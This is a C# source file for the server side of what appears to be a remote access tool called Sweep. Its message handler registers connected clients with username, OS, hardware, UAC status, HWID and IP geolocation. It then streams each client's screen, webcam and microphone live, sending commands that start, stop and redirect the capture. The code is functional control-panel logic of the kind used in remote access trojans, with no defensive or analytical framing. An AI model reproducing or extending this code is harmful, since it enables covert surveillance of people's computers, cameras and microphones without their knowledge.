using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using BrightIdeasSoftware;
using LazyServer;
using Newtonsoft.Json.Linq;
using Sweep.Forms;
using Sweep.Models;
using Sweep.UI;
using NAudio.Wave;

namespace Sweep.Services
{
    public class MessageHandler
    {
        private readonly LazyServerHost _server;
        private readonly ObjectListView _listView;
        private readonly ObjectListView _logsview;
        private Sweep.Forms.Sweep _sweepform;

        // One viewer per client
        private readonly Dictionary<string, ScreenViewer> screenViewers = new();
        private readonly Dictionary<string, WebcamViewer> webcamViewers = new();
        private readonly Dictionary<string, MicViewer> micViewers = new();

        // Audio playback
        private readonly Dictionary<string, WaveOutEvent> waveOuts = new();
        private readonly Dictionary<string, BufferedWaveProvider> bufferedProviders = new();

        public MessageHandler(LazyServerHost server, ObjectListView listView, int port, ObjectListView logsview, Forms.Sweep th)
        {
            _server = server ?? throw new ArgumentNullException(nameof(server));
            _listView = listView ?? throw new ArgumentNullException(nameof(listView));
            _logsview = logsview ?? throw new ArgumentNullException(nameof(logsview));
            _sweepform = th ?? throw new ArgumentNullException(nameof(th));

            ListViewConfigurator.Configure(_listView, port);

            _server.MessageReceived += OnTextMessageReceived;
            _server.FileOfferWithMetaReceived += OnFileOfferWithMetaReceived;
            _server.ClientDisconnected += OnClientDisconnected;
        }

        private void OnTextMessageReceived(object sender, MessageEventArgs e)
        {
            Console.WriteLine($"[MSG] From {e.ClientId}: {e.Message}");
        }

        private async void OnFileOfferWithMetaReceived(object sender, FileOfferWithMetaEventArgs e)
        {
            JObject meta;
            try
            {
                meta = JObject.Parse(e.FileRequest.Metadata);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Invalid JSON metadata: " + ex.Message);
                return;
            }

            var msgType = (string)meta["msg"] ?? "";
            switch (msgType)
            {
                case "alive":
                    await HandleAliveAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                    break;

                case "screenshot":
                    await HandleScreenshotAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                    break;

                case "log":
                    AddLogToList(meta);
                    break;

                case "camframe":
                    await HandleWebcamAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                    break;

                case "micaudio":
                    await HandleMicAudioAsync(meta, e.ClientId, e.FileRequest.FileBytes);
                    break;

                default:
                    Console.WriteLine($"[WARN] Unknown msg type '{msgType}' from {e.ClientId}");
                    break;
            }
        }

        private void AddLogToList(JObject meta)
        {
            var log = new Log
            {
                Time = DateTime.Now.ToString("HH:mm:ss"),
                Message = (string)meta["message"],
                Type = (string)meta["type"]
            };

            if (_listView.InvokeRequired)
                _logsview.Invoke(new Action(() => _logsview.AddObject(log)));
            else
                _logsview.AddObject(log);
        }

        private async Task HandleScreenshotAsync(JObject meta, string clientId, byte[] packet)
        {
            if (!screenViewers.ContainsKey(clientId) || screenViewers[clientId].IsDisposed)
            {
                void ShowViewer()
                {
                    var viewer = new ScreenViewer();
                    screenViewers[clientId] = viewer;

                    viewer.SetMonitors((int)meta["monitors"]);

                    viewer.QualityChanged += async (quality) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "ssloop", ["quality"] = quality }.ToString());
                    };

                    viewer.ScreenEvent += async (active) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = active ? "ssloop" : "stopss" }.ToString());
                    };

                    viewer.MonitorChanged += async (index) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "mon", ["idx"] = index }.ToString());
                    };

                    viewer.Closing += async () =>
                    {
                        screenViewers.Remove(clientId);
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "stopss" }.ToString());
                    };

                    viewer.Show();
                }

                if (_listView.InvokeRequired)
                    _listView.Invoke((Action)ShowViewer);
                else
                    ShowViewer();
            }

            using var ms = new MemoryStream(packet);
            var image = Image.FromStream(ms);
            try { screenViewers[clientId].SetScreen(image); } catch (Exception ex) {
                AddLogToList(new JObject { 
                    ["message"] = ex.Message,
                    ["type"] = "Error"
                });
            };
            
        }

        private async Task HandleWebcamAsync(JObject meta, string clientId, byte[] packet)
        {
            if (!webcamViewers.ContainsKey(clientId) || webcamViewers[clientId].IsDisposed)
            {
                void ShowViewer()
                {
                    var viewer = new WebcamViewer();
                    webcamViewers[clientId] = viewer;

                    viewer.SetMonitors((int?)meta["cameras"] ?? 1);

                    viewer.QualityChanged += async (quality) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "camloop", ["quality"] = quality }.ToString());
                    };

                    viewer.ScreenEvent += async (active) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = active ? "camloop" : "stopcam" }.ToString());
                    };

                    viewer.MonitorChanged += async (index) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "cam", ["idx"] = index }.ToString());
                    };

                    viewer.Closing += async () =>
                    {
                        webcamViewers.Remove(clientId);
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "stopcam" }.ToString());
                    };

                    viewer.Show();
                }

                if (_listView.InvokeRequired)
                    _listView.Invoke((Action)ShowViewer);
                else
                    ShowViewer();
            }

            using var ms = new MemoryStream(packet);
            var image = Image.FromStream(ms);
            webcamViewers[clientId].SetScreen(image);
        }

        private async Task HandleMicAudioAsync(JObject meta, string clientId, byte[] audioBytes)
        {
            if (!micViewers.ContainsKey(clientId) || micViewers[clientId].IsDisposed)
            {
                void CreateViewer()
                {
                    var viewer = new MicViewer();
                    micViewers[clientId] = viewer;

                    viewer.SetMonitors((int)meta["microphones"]);

                    viewer.Mic += async (active) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = active ? "micloop" : "stopmic" }.ToString());
                    };

                    viewer.DeviceChanged += async (index) =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "stopmic" }.ToString());
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "mic", ["idx"] = index }.ToString());
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "micloop" }.ToString());
                    };

                    viewer.MicClosing += async () =>
                    {
                        await _server.SendMessageToClient(clientId, new JObject { ["command"] = "stopmic" }.ToString());
                    };

                    viewer.FormClosed += (s, e) =>
                    {
                        micViewers.Remove(clientId);
                        waveOuts.TryGetValue(clientId, out var waveOut);
                        waveOut?.Stop();
                        waveOut?.Dispose();
                        waveOuts.Remove(clientId);
                        bufferedProviders.Remove(clientId);
                    };

                    viewer.Show();
                }

                if (_listView.InvokeRequired)
                    _listView.Invoke((Action)CreateViewer);
                else
                    CreateViewer();
            }

            if (!waveOuts.ContainsKey(clientId))
            {
                var waveFormat = new WaveFormat(8000, 1);
                var provider = new BufferedWaveProvider(waveFormat)
                {
                    DiscardOnBufferOverflow = true,
                    BufferLength = 1024 * 100
                };
                var waveOut = new WaveOutEvent();
                waveOut.Init(provider);
                waveOut.Play();

                waveOuts[clientId] = waveOut;
                bufferedProviders[clientId] = provider;
            }

            bufferedProviders[clientId].AddSamples(audioBytes, 0, audioBytes.Length);
        }

        private async Task HandleAliveAsync(JObject meta, string clientId, byte[] packet)
        {
            try
            {
                var ip = (string)meta["ip"];
                var flag = await FlagDownloader.GetFlagImageByIpAsync(ip);
                var country = await FlagDownloader.GetCountryAsync(ip);

                using var ms = new MemoryStream(packet);
                var screen = Image.FromStream(ms);

                var client = new ClientInfo
                {
                    Screen = screen,
                    IP = ip,
                    Country = country,
                    Flag = flag,
                    ID = clientId,
                    Username = (string)meta["username"],
                    OperatingSystem = (string)meta["os"],
                    CPU = (string)meta["cpu"],
                    GPU = (string)meta["gpu"],
                    UAC = (string)meta["uac"],
                    HWID = (string)meta["hwid"],
                };

                if (_listView.InvokeRequired)
                    _listView.BeginInvoke(new Action(() => _listView.AddObject(client)));
                else
                    _listView.AddObject(client);

                AddLogToList(new JObject
                {
                    ["message"] = $"Client connected {clientId}",
                    ["type"] = "Info"
                });
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error in HandleAliveAsync: " + ex);
                AddLogToList(new JObject
                {
                    ["message"] = ex.Message,
                    ["type"] = "Error"
                });
            }
        }

        private void OnClientDisconnected(object sender, string clientId)
        {
            if (_listView.InvokeRequired)
                _listView.Invoke(new Action(() => RemoveClientById(clientId)));
            else
                RemoveClientById(clientId);

            screenViewers.TryGetValue(clientId, out var sv);
            sv?.Invoke(new Action(() => sv.Close()));
            screenViewers.Remove(clientId);

            webcamViewers.TryGetValue(clientId, out var wv);
            wv?.Invoke(new Action(() => wv.Close()));
            webcamViewers.Remove(clientId);

            micViewers.TryGetValue(clientId, out var mv);
            mv?.Invoke(new Action(() => mv.Close()));
            micViewers.Remove(clientId);

            waveOuts.TryGetValue(clientId, out var wo);
            wo?.Stop();
            wo?.Dispose();
            waveOuts.Remove(clientId);
            bufferedProviders.Remove(clientId);
        }

        private void RemoveClientById(string clientId)
        {
            try
            {
                var obj = _listView.Objects.Cast<ClientInfo>().FirstOrDefault(c => c.ID == clientId);
                if (obj != null)
                {
                    _listView.RemoveObject(obj);
                    Console.WriteLine($"Client disconnected and removed: {clientId}");
                }
            }
            catch { }
        }
    }
}